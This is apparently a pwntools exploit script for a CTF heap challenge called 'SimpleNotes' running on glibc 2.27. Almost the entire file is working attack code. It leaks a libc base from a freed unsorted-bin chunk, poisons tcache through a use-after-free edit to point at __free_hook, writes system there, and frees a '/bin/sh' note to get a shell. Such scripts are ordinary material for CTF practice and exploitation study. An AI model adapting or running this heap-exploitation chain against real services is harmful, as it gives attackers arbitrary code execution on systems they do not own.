from pwn import *
from icecream import ic

elf = exe = ELF("./SimpleNotes_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True
context.terminal = ['/mnt/c/Windows/system32/cmd.exe', '/c', 'start', 'wt.exe', '-w', '0', 'split-pane', '-d', '.', 'wsl.exe', '-d', 'Ubuntu', 'bash', '-c']
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0xd45
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def gad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def i(): return io.interactive()

io = start()

def create(id, size, note):
    ru(">> ")
    sl("1")
    ru("Enter the id of note: ")
    sl(f"{id}")
    ru("Enter the size of note: ")
    sl(f"{size}")
    ru("Enter the note: ")
    sl(note)

def edit(id, size, note):
    ru(">> ")
    sl("2")
    ru("Enter the id of note: ")
    sl(f"{id}")
    ru("Enter the size of note: ")
    sl(f"{size}")
    ru("Enter the note: ")
    s(f"{note}")    

def dele(id):
    ru(">> ")
    sl("3")
    ru("Enter the id of note: ")
    sl(f"{id}")

def read(id):
    ru(">> ")
    sl("4")
    ru("Enter the id of note: ")
    sl(f"{id}")
    ru('bbbb')
    leak = u64(re(6).ljust(8, b'\x00'))
    return leak

def exit_note():
    ru(">> ")
    sl("5")
    
create(0, 0x78, b"JUNKJUNK")
create(2, 0x518, b"JUNKJUNK")
create(1, 0x78, b"JUNKJUNK")

dele(2)

read(2)

libc.address = u64(rl().strip().ljust(8, b"\x00")) - 0x3ebca0
ic(hex(libc.address))

dele(0)
dele(1)

edit(1, 0x10, p64(libc.sym.__free_hook))

create(3, 0x78, b"/bin/sh\x00")
create(4, 0x78, p64(libc.sym.system))

pause()

dele(3)

io.interactive()